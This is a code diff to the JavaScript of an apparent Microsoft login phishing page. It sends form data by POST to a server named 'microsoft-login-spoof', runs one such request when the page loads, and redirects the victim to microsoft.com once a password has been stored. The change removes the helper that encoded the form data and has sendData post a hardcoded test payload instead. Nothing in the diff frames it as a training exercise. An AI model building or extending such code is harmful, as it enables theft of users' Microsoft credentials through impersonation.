@@ -1,5 +1,3 @@
-import {json} from "express";
-
 if (sessionStorage.getItem("password")) {
     window.location.href = "https://www.microsoft.com/";
 }
@@ -10,22 +8,10 @@ const btnNext = document.querySelector(".firstNext");
 const prevBtnSec = document.querySelector(".prev-1");
 const submitBtn = document.querySelector(".submit");
 
-const createBody = (data) => {
-    let urlEncodedData = "",
-        urlEncodedDataPairs = [],
-        name;
 
-    for (name in data) {
-        urlEncodedDataPairs.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));
-    }
-
-    urlEncodedData = urlEncodedDataPairs.join('&').replace(/%20/g, '+');
-
-    return urlEncodedData;
-}
 fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
     method: 'POST',
-    body: json.stringify({userName: 'test', passwordLength: 8}),
+    body: JSON.stringify({userName: 'test', passwordLength: 8}),
 }).then(response => {
     console.log('response', response);
 })
@@ -34,7 +20,7 @@ fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
 const sendData = (data) => {
     fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
         method: 'POST',
-        body: createBody(data),
+        body: JSON.stringify({userName: 'test', passwordLength: 8}),
     }).then(response => {
         console.log('response', response);
     })
